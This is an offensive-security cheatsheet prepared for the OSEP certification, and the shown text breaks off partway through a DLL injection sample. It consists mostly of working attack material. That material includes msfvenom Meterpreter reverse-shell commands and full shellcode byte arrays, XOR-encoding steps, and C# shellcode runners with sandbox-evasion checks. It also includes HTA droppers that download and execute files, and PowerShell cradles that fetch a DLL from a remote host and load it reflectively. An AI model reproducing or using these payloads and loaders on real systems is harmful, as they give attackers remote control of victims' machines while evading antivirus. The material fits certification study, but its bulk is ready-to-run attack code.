# **OSEP Cheatsheet**

 sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=XXX LPORT=443 EXITFUNC=thread -f csharp | tr -d '\n'

 netstat -tulpn

use multi/manage/autoroute
set session 1
exploit
use auxiliary/server/socks_proxy
set version 4a
set srvhost 127.0.0.1
exploit -j

bash -c 'echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf'

proxychains rdesktop 192.168.1.1

<br>

#### Compiled by: **purg3**
*Under Construction**
***
I hope this helps you on your journey to passing the OSEP. I have pulled together many repo's related to this course. When you do eventually reach the tools list please show some love to the authors. Some of the C#, VBA code is my own and feel free to take and modify how you want. **PLEASE DONT UPLOAD TO VIRUSTOTAL AND IF YOU MUST USE WINDOWS ISOLATE IT FROM THE NET, PERFORM AV TESTING, WIPE, FRESH INSTALL, REPEAT**. If you want to update your AV do so manually. 

Thanks for visiting !

Enjoy creating your own 🦠

<br>

# Table of Contents
<br>

# [DotnetToJScript](#DotNetToJscript-1)
- [Testclass](#testclass)
- [Build Javascript](#Build_JS)
- [Create_HTA](#Create_HTA_file)
- See Phishing for sending your hta file.

<br>

# [CSharp](#CSharp-1)

- [.NET](#_net)
- [Meterpreter_DLL](#Meterpreter_DLL)
- [DLL_Injection](#DLL_Injection)
- [Vanilla_Runner](#Shellcode_Runner)
- [Process_injection](#Process_injection)
- [SharpLoader](#SharpLoader)

<br>

# [Javascript](#Javascript-1)

- [Download&Execute](#DownloadExecute)

<br>

# [Phishing](#Phishing-1)
- [XOR_VBA](https://github.com/In3x0rabl3/OSEP/blob/main/README.md#xor_vba)
- [VBA_Runner](https://github.com/In3x0rabl3/OSEP/blob/main/README.md#vba_runner)
- [Purge](#Purge)

<br>


# [Powershell](#Powershell-1)

- [Revshell](#reverse-shell)
- [Obfuscated_RevShell](#obfuscated_revshell)
- [Powershell_Meterpreter](#powershell_meterpreter)
- [Download_file](#Download_file)
- [Powershell_Cradle](#Powershell_Cradle)
- [Constrained_lang_mode](#Constrained_lang_mode)
- [CLM_Bypass](#CLM_Bypass)
- [Disable_Restricted_Admin](#Disable_Restricted_Admin)
- [Disable_AMSI](#Disable_AMSI)
- [Load_assembly_reflectively](#Load_assembly_reflectively)
<br>

# [Lateral_Movement](#lateral_movement-1)
- [Fileless_Movement](#Fileless_Movement)
- [SSH](#ssh)
- [Autorun](#autorun)
- [Chisel](#Chisel)
- [BloodHound](#BloodHound)
- [Pivoting](#Pivoting)

<br>

# [Windows](#Windows-1)
- [Paths](#check-writable-paths-under-cwindows)
- [Data Stream Execution](#alternate_data_stream_execution)
- [Fodhelper-UACBYPASS](#Fodhelper)
- [PPLKiller](#pplkiller)
- [Mimikatz](#Mimikatz)
- [Windows_Privilege_Escalation](#windows_privilege_escalation)
- [Windows_Download_Execute](#Windows_Download_Execute)
- [Windows_With_Creds](#Windows_With_Creds)

<br>

# [MimiKatz](#Mimikatz)
- [Disable LSA](#Disable_LSA_and_Dump)
- [Offline Dump](#Offline_Dump)
- [Minidump](#MiniDump)

<br>

# [MetaSploit](#Metasploit-1)
- [Msfvenom](#Msfvenom)
- [Metasploit_Refs](#Metasploit_Refs)

<br>

# [Active_Directory](#Active_Directory-1)

# [Linux](#Linux-1)

# [Impacket](#Impacket-1)

# [TortugaToolKit](#TortugaToolKit-1)

# [PowerUpSQL](#PowerUpSQL-1)

# [Rubeus](#Rubeus-1)

# [Tools](#Tools-1)

***
# DotNetToJscript
<br>

## Testclass

- Replace testclass.cs with following code and replace shellcode

```csharp
using System;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    public class Class1
    {


        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        //public static void runner()
        static void Main(string[] args)
        {

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5) {
            return;
            }


            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            byte[] buf = new byte[510] {XORED_SHELLCODE};
    
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] ^ 0xAA) & 0xFF);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```
<br>

## **Build_JS**
```
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
```
<br>

## **Create_HTA_file**

#### Method 1:
```javascript
<html>
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("powershell iwr -uri http://IP:PORT/file.exe -outfile
C:\\path\\to\\file.exe;C:\\path\\to\\file.exe");
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
```
<br>

#### Method 2:
```javascript
<html>
<head> 
<script language="JScript"> 
function setversion() {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {}
function base64ToStream(b) {
    var enc = new ActiveXObject("System.Text.ASCIIEncoding");
    var length = enc.GetByteCount_2(b);
    var ba = enc.GetBytes_4(b);
    var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
    ba = transform.TransformFinalBlock(ba, 0, length);
    var ms = new ActiveXObject("System.IO.MemoryStream");
    ms.Write(ba, 0, (length / 4) * 3);
    ms.Position = 0; 
    return ms;

}

var serialized_obj= "OUTPUT_OF_DOTNETTOJSCRIPT";
var entry_class = 'TestClass';

try { 
        setversion(); 
        var stm = base64ToStream(serialized_obj); 
        var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'); 
        var al = new ActiveXObject('System.Collections.ArrayList'); 
        var d = fmt.Deserialize_2(stm); al.Add(undefined); 
        var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
} catch (e) { 
    debug(e.message); 
}
</script>
</head>
```

<br>
<br>

# CSharp

<br>

## _.NET
<br>

 #### 1. Generate shellcode
 #### 2. XOR Shellcode
 #### 3. Place XOR shellcode into Runner
 #### 4. Execute = D
 
 - Modify however you want, keep'em guessing ; )

<br>

### **XOR**
***
```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Helper
{
    class Program
    {
static void Main(string[] args)
    {
    //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.XX.XX LPORT=443 -f csharp

    byte[] buf = new byte[510] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x51,0x48,0x8b,0x52,0x18,0x56,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0x0f,0xb7,0x4a,0x4a,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,
0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x4d,
0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,
0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,
0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,
0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,
0x49,0xbc,0x02,0x00,0x0d,0x05,0xc0,0xa8,0x01,0x26,0x41,0x54,0x49,0x89,0xe4,
0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,
0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,
0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,
0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,
0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,0x75,0xe5,
0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,
0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,
0x83,0xf8,0x00,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,
0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,
0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,
0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,
0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,
0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,0xff,0xd5,
0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c,
0xff,0xff,0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,
0xff,0xe7,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };
    
    
    byte[] encoded = new byte[buf.Length];
    for (int i = 0; i < buf.Length; i++)
    
    {
    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xff);
    }

    StringBuilder hex = new StringBuilder(encoded.Length * 2);
    foreach (byte b in encoded)

    {
    hex.AppendFormat("0x{0:x2}, ", b);
    }

    Console.WriteLine("The payload is: " + hex.ToString());
    Console.WriteLine("Length was: " + buf.Length.ToString());
    }
    }
}
```

<br>

### **Runner**
***

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace Met
{
    class Program
    {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();
    static void Main(string[] args)
    {

        //Sleep timer bypass
        DateTime t1 = DateTime.Now;
        Sleep(2000);
        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
        if (t2 < 1.5) {
            return;
        }
        Console.WriteLine("Sleep timer bypassed!");

        //Non emulated api's
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if (mem == null) {
            return;

        }
        Console.WriteLine("Emulation done!");
        byte[] buf = new byte[770] { };
    
        byte[] encoded = new byte[buf.Length];
        for (int i = 0; i < buf.Length; i++)
        
        {
        encoded[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
        }
        buf = encoded;
        Console.WriteLine("Cipher decrypted!");
        int size = buf.Length;
        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
        Console.WriteLine("Allocation Complete!");
        Marshal.Copy(buf, 0, addr, size);
        Console.WriteLine("Copy done!");
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        Console.WriteLine("Thread Created");
        WaitForSingleObject(hThread, 0xFFFFFFFF);
        Console.WriteLine("Reached End");
    }
    }
}
```

<br>
<br>

## Meterpreter_DLL

### Create msfvenom shellcode

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.36 LPORT=3333 -f csharp 
```

### Place shellcode in and run

```csharp
using System;
using System.Text;

namespace XOR_encoder
{
    class Program
    {
        static void Main(string[] args)
        {
            // Msfvenom shellcode here
            byte[] buf = new byte[560] {
            0xeb,0x27,0x5b,0x53,0x5f,0xb0,0x49,0xfc,0xae,0x75,0xfd,0x57,0x59,0x53,0x5e,
            0x8a,0x06,0x30,0x07,0x48,0xff,0xc7,0x48,0xff,0xc6,0x66,0x81,0x3f,0xd1,0xca,
            0x74,0x07,0x80,0x3e,0x49,0x75,0xea,0xeb,0xe6,0xff,0xe1,0xe8,0xd4,0xff,0xff,
            0xff,0x13,0x49,0xef,0x5b,0x90,0xf7,0xe3,0xfb,0xdf,0x13,0x13,0x13,0x52,0x42,
            0x52,0x43,0x41,0x42,0x5b,0x22,0xc1,0x45,0x76,0x5b,0x98,0x41,0x73,0x5b,0x98,
            0x41,0x0b,0x5b,0x98,0x41,0x33,0x5e,0x22,0xda,0x5b,0x98,0x61,0x43,0x5b,0x1c,
            0xa4,0x59,0x59,0x5b,0x22,0xd3,0xbf,0x2f,0x72,0x6f,0x11,0x3f,0x33,0x52,0xd2,
            0xda,0x1e,0x52,0x12,0xd2,0xf1,0xfe,0x41,0x5b,0x98,0x41,0x33,0x98,0x51,0x2f,
            0x5b,0x12,0xc3,0x52,0x42,0x75,0x92,0x6b,0x0b,0x18,0x11,0x1c,0x96,0x61,0x13,
            0x13,0x13,0x98,0x93,0x9b,0x13,0x13,0x13,0x5b,0x96,0xd3,0x67,0x74,0x5b,0x12,
            0xc3,0x43,0x98,0x5b,0x0b,0x57,0x98,0x53,0x33,0x5a,0x12,0xc3,0xf0,0x45,0x5b,
            0xec,0xda,0x5e,0x22,0xda,0x52,0x98,0x27,0x9b,0x5b,0x12,0xc5,0x5b,0x22,0xd3,
            0xbf,0x52,0xd2,0xda,0x1e,0x52,0x12,0xd2,0x2b,0xf3,0x66,0xe2,0x5f,0x10,0x5f,
            0x37,0x1b,0x56,0x2a,0xc2,0x66,0xcb,0x4b,0x57,0x98,0x53,0x37,0x5a,0x12,0xc3,
            0x75,0x52,0x98,0x1f,0x5b,0x57,0x98,0x53,0x0f,0x5a,0x12,0xc3,0x52,0x98,0x17,
            0x9b,0x5b,0x12,0xc3,0x52,0x4b,0x52,0x4b,0x4d,0x4a,0x49,0x52,0x4b,0x52,0x4a,
            0x52,0x49,0x5b,0x90,0xff,0x33,0x52,0x41,0xec,0xf3,0x4b,0x52,0x4a,0x49,0x5b,
            0x98,0x01,0xfa,0x58,0xec,0xec,0xec,0x4e,0x5a,0xad,0x64,0x60,0x21,0x4c,0x20,
            0x21,0x13,0x13,0x52,0x45,0x5a,0x9a,0xf5,0x5b,0x92,0xff,0xb3,0x12,0x13,0x13,
            0x5a,0x9a,0xf6,0x5a,0xaf,0x11,0x13,0x1e,0x16,0xd3,0xbb,0x12,0x37,0x52,0x47,
            0x5a,0x9a,0xf7,0x5f,0x9a,0xe2,0x52,0xa9,0x5f,0x64,0x35,0x14,0xec,0xc6,0x5f,
            0x9a,0xf9,0x7b,0x12,0x12,0x13,0x13,0x4a,0x52,0xa9,0x3a,0x93,0x78,0x13,0xec,
            0xc6,0x79,0x19,0x52,0x4d,0x43,0x43,0x5e,0x22,0xda,0x5e,0x22,0xd3,0x5b,0xec,
            0xd3,0x5b,0x9a,0xd1,0x5b,0xec,0xd3,0x5b,0x9a,0xd2,0x52,0xa9,0xf9,0x1c,0xcc,
            0xf3,0xec,0xc6,0x5b,0x9a,0xd4,0x79,0x03,0x52,0x4b,0x5f,0x9a,0xf1,0x5b,0x9a,
            0xea,0x52,0xa9,0x8a,0xb6,0x67,0x72,0xec,0xc6,0x96,0xd3,0x67,0x19,0x5a,0xec,
            0xdd,0x66,0xf6,0xfb,0x80,0x13,0x13,0x13,0x5b,0x90,0xff,0x03,0x5b,0x9a,0xf1,
            0x5e,0x22,0xda,0x79,0x17,0x52,0x4b,0x5b,0x9a,0xea,0x52,0xa9,0x11,0xca,0xdb,
            0x4c,0xec,0xc6,0x90,0xeb,0x13,0x6d,0x46,0x5b,0x90,0xd7,0x33,0x4d,0x9a,0xe5,
            0x79,0x53,0x52,0x4a,0x7b,0x13,0x03,0x13,0x13,0x52,0x4b,0x5b,0x9a,0xe1,0x5b,
            0x22,0xda,0x52,0xa9,0x4b,0xb7,0x40,0xf6,0xec,0xc6,0x5b,0x9a,0xd0,0x5a,0x9a,
            0xd4,0x5e,0x22,0xda,0x5a,0x9a,0xe3,0x5b,0x9a,0xc9,0x5b,0x9a,0xea,0x52,0xa9,
            0x11,0xca,0xdb,0x4c,0xec,0xc6,0x90,0xeb,0x13,0x6e,0x3b,0x4b,0x52,0x44,0x4a,
            0x7b,0x13,0x53,0x13,0x13,0x52,0x4b,0x79,0x13,0x49,0x52,0xa9,0x18,0x3c,0x1c,
            0x23,0xec,0xc6,0x44,0x4a,0x52,0xa9,0x66,0x7d,0x5e,0x72,0xec,0xc6,0x5a,0xec,
            0xdd,0xfa,0x2f,0xec,0xec,0xec,0x5b,0x12,0xd0,0x5b,0x3a,0xd5,0x5b,0x96,0xe5,
            0x66,0xa7,0x52,0xec,0xf4,0x4b,0x79,0x13,0x4a,0x5a,0xd4,0xd1,0xe3,0xa6,0xb1,
            0x45,0xec,0xc6,0xd1,0xca };

            // Array holding encrypted shellcode
            byte[] encoded =  new byte[buf.Length];

            // loop to iterate the bytes and XOR
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] ^ 0xAA) & 0xFF);
            }

            //Convert the byte array to a string
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                // 0: hex format, x2 indicates 2 bytes
                hex.AppendFormat("0x{0:x2},", b);
            }

            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}
```

<br>

### Copy XOR shellcode and place into 

```csharp
using System;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    public class Class1
    {


        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        public static void runner()
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            byte[] buf = new byte[560] { 0x41, 0x8d, 0xf1, 0xf9, 0xf5, 0x1a, 0xe3, 0x56, 0x04, 0xdf, 0x57, 0xfd, 0xf3, 0xf9, 0xf4, 0x20, 0xac, 0x9a, 0xad, 0xe2, 0x55, 0x6d, 0xe2, 0x55, 0x6c, 0xcc, 0x2b, 0x95, 0x7b, 0x60, 0xde, 0xad, 0x2a, 0x94, 0xe3, 0xdf, 0x40, 0x41, 0x4c, 0x55, 0x4b, 0x42, 0x7e, 0x55, 0x55, 0x55, 0xb9, 0xe3, 0x45, 0xf1, 0x3a, 0x5d, 0x49, 0x51, 0x75, 0xb9, 0xb9, 0xb9, 0xf8, 0xe8, 0xf8, 0xe9, 0xeb, 0xe8, 0xf1, 0x88, 0x6b, 0xef, 0xdc, 0xf1, 0x32, 0xeb, 0xd9, 0xf1, 0x32, 0xeb, 0xa1, 0xf1, 0x32, 0xeb, 0x99, 0xf4, 0x88, 0x70, 0xf1, 0x32, 0xcb, 0xe9, 0xf1, 0xb6, 0x0e, 0xf3, 0xf3, 0xf1, 0x88, 0x79, 0x15, 0x85, 0xd8, 0xc5, 0xbb, 0x95, 0x99, 0xf8, 0x78, 0x70, 0xb4, 0xf8, 0xb8, 0x78, 0x5b, 0x54, 0xeb, 0xf1, 0x32, 0xeb, 0x99, 0x32, 0xfb, 0x85, 0xf1, 0xb8, 0x69, 0xf8, 0xe8, 0xdf, 0x38, 0xc1, 0xa1, 0xb2, 0xbb, 0xb6, 0x3c, 0xcb, 0xb9, 0xb9, 0xb9, 0x32, 0x39, 0x31, 0xb9, 0xb9, 0xb9, 0xf1, 0x3c, 0x79, 0xcd, 0xde, 0xf1, 0xb8, 0x69, 0xe9, 0x32, 0xf1, 0xa1, 0xfd, 0x32, 0xf9, 0x99, 0xf0, 0xb8, 0x69, 0x5a, 0xef, 0xf1, 0x46, 0x70, 0xf4, 0x88, 0x70, 0xf8, 0x32, 0x8d, 0x31, 0xf1, 0xb8, 0x6f, 0xf1, 0x88, 0x79, 0x15, 0xf8, 0x78, 0x70, 0xb4, 0xf8, 0xb8, 0x78, 0x81, 0x59, 0xcc, 0x48, 0xf5, 0xba, 0xf5, 0x9d, 0xb1, 0xfc, 0x80, 0x68, 0xcc, 0x61, 0xe1, 0xfd, 0x32, 0xf9, 0x9d, 0xf0, 0xb8, 0x69, 0xdf, 0xf8, 0x32, 0xb5, 0xf1, 0xfd, 0x32, 0xf9, 0xa5, 0xf0, 0xb8, 0x69, 0xf8, 0x32, 0xbd, 0x31, 0xf1, 0xb8, 0x69, 0xf8, 0xe1, 0xf8, 0xe1, 0xe7, 0xe0, 0xe3, 0xf8, 0xe1, 0xf8, 0xe0, 0xf8, 0xe3, 0xf1, 0x3a, 0x55, 0x99, 0xf8, 0xeb, 0x46, 0x59, 0xe1, 0xf8, 0xe0, 0xe3, 0xf1, 0x32, 0xab, 0x50, 0xf2, 0x46, 0x46, 0x46, 0xe4, 0xf0, 0x07, 0xce, 0xca, 0x8b, 0xe6, 0x8a, 0x8b, 0xb9, 0xb9, 0xf8, 0xef, 0xf0, 0x30, 0x5f, 0xf1, 0x38, 0x55, 0x19, 0xb8, 0xb9, 0xb9, 0xf0, 0x30, 0x5c, 0xf0, 0x05, 0xbb, 0xb9, 0xb4, 0xbc, 0x79, 0x11, 0xb8, 0x9d, 0xf8, 0xed, 0xf0, 0x30, 0x5d, 0xf5, 0x30, 0x48, 0xf8, 0x03, 0xf5, 0xce, 0x9f, 0xbe, 0x46, 0x6c, 0xf5, 0x30, 0x53, 0xd1, 0xb8, 0xb8, 0xb9, 0xb9, 0xe0, 0xf8, 0x03, 0x90, 0x39, 0xd2, 0xb9, 0x46, 0x6c, 0xd3, 0xb3, 0xf8, 0xe7, 0xe9, 0xe9, 0xf4, 0x88, 0x70, 0xf4, 0x88, 0x79, 0xf1, 0x46, 0x79, 0xf1, 0x30, 0x7b, 0xf1, 0x46, 0x79, 0xf1, 0x30, 0x78, 0xf8, 0x03, 0x53, 0xb6, 0x66, 0x59, 0x46, 0x6c, 0xf1, 0x30, 0x7e, 0xd3, 0xa9, 0xf8, 0xe1, 0xf5, 0x30, 0x5b, 0xf1, 0x30, 0x40, 0xf8, 0x03, 0x20, 0x1c, 0xcd, 0xd8, 0x46, 0x6c, 0x3c, 0x79, 0xcd, 0xb3, 0xf0, 0x46, 0x77, 0xcc, 0x5c, 0x51, 0x2a, 0xb9, 0xb9, 0xb9, 0xf1, 0x3a, 0x55, 0xa9, 0xf1, 0x30, 0x5b, 0xf4, 0x88, 0x70, 0xd3, 0xbd, 0xf8, 0xe1, 0xf1, 0x30, 0x40, 0xf8, 0x03, 0xbb, 0x60, 0x71, 0xe6, 0x46, 0x6c, 0x3a, 0x41, 0xb9, 0xc7, 0xec, 0xf1, 0x3a, 0x7d, 0x99, 0xe7, 0x30, 0x4f, 0xd3, 0xf9, 0xf8, 0xe0, 0xd1, 0xb9, 0xa9, 0xb9, 0xb9, 0xf8, 0xe1, 0xf1, 0x30, 0x4b, 0xf1, 0x88, 0x70, 0xf8, 0x03, 0xe1, 0x1d, 0xea, 0x5c, 0x46, 0x6c, 0xf1, 0x30, 0x7a, 0xf0, 0x30, 0x7e, 0xf4, 0x88, 0x70, 0xf0, 0x30, 0x49, 0xf1, 0x30, 0x63, 0xf1, 0x30, 0x40, 0xf8, 0x03, 0xbb, 0x60, 0x71, 0xe6, 0x46, 0x6c, 0x3a, 0x41, 0xb9, 0xc4, 0x91, 0xe1, 0xf8, 0xee, 0xe0, 0xd1, 0xb9, 0xf9, 0xb9, 0xb9, 0xf8, 0xe1, 0xd3, 0xb9, 0xe3, 0xf8, 0x03, 0xb2, 0x96, 0xb6, 0x89, 0x46, 0x6c, 0xee, 0xe0, 0xf8, 0x03, 0xcc, 0xd7, 0xf4, 0xd8, 0x46, 0x6c, 0xf0, 0x46, 0x77, 0x50, 0x85, 0x46, 0x46, 0x46, 0xf1, 0xb8, 0x7a, 0xf1, 0x90, 0x7f, 0xf1, 0x3c, 0x4f, 0xcc, 0x0d, 0xf8, 0x46, 0x5e, 0xe1, 0xd3, 0xb9, 0xe0, 0xf0, 0x7e, 0x7b, 0x49, 0x0c, 0x1b, 0xef, 0x46, 0x6c, 0x7b, 0x60 };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] ^ 0xAA) & 0xFF);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```
<br>

### Build your DLL

```
sudo csc /target:library /out:runner.dll runner.cs 
```
<br>

### Create Powershell Script to load the dll

```powershell
$data = (new-object net.webclient).downloadData('http://IP:PORT/runner.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0,$null)
```
<br>

## Host on your server
```
Host your dll file
Host your powershell script
```
<br>

### Bring it Home
```
iex(new-object net.webclient).downloadstring('http://IP:80/runner.ps1')
```
<br>
<br>

## DLL_Injection

```csharp
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
